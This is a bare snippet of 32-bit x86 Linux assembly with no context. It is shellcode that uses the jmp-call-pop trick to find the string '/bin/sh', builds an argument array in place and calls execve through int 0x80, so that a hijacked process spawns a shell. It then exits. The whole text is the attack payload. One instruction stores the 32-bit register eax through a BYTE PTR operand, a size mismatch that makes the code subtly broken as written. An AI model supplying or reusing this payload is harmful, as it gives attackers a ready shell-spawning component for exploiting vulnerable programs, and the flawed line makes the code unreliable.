       jmp call;
shell: pop esi;
       xor eax, eax;
       mov BYTE PTR [esi+0x7], eax;
       mov DWORD PTR [esi+0x8], esi;
       mov DWORD PTR [esi+0xc], eax;
       mov al, 0xb;
       mov ebx, esi;
       lea ecx, DWORD PTR [esi+0x8];
       xor edx, edx;
       int 0x80;
       xor ebx, ebx;
       mov eax, ebx;
       inc eax;
       int 0x80;
call:  call shell;
      .string "/bin/sh"
